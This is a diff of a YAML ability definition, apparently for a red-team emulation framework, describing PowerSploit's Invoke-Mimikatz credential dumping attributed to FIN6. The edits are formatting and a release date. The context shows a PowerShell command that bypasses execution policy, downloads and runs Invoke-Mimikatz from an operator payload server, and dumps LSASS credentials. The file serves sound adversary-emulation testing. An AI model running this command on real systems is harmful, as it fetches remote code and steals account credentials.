@@ -2,10 +2,11 @@ id: ccdb8caf-c69e-424b-b930-551969450c57
 metadata:
   version: 2
   authors:
-    - privateducky
-    - MITRE
+  - privateducky
+  - MITRE
   tags:
-    - FIN6
+  - FIN6
+  release_date: 2021-08-25
 name: PowerSploit Invoke-Mimikatz
 description: |
   PowerSploit is an open source, offensive security framework comprised of PowerShell modules and scripts that perform
@@ -14,9 +15,9 @@ description: |
 tactic: credential-access
 technique:
   id: T1003.001
-  name: "OS Credential Dumping: LSASS Memory - Invoke-Mimikatz"
+  name: 'OS Credential Dumping: LSASS Memory - Invoke-Mimikatz'
 platforms:
   windows:
     psh:
-      command: |
+      command: |-
         powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('#{operator.payloads}/PowerSploit/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
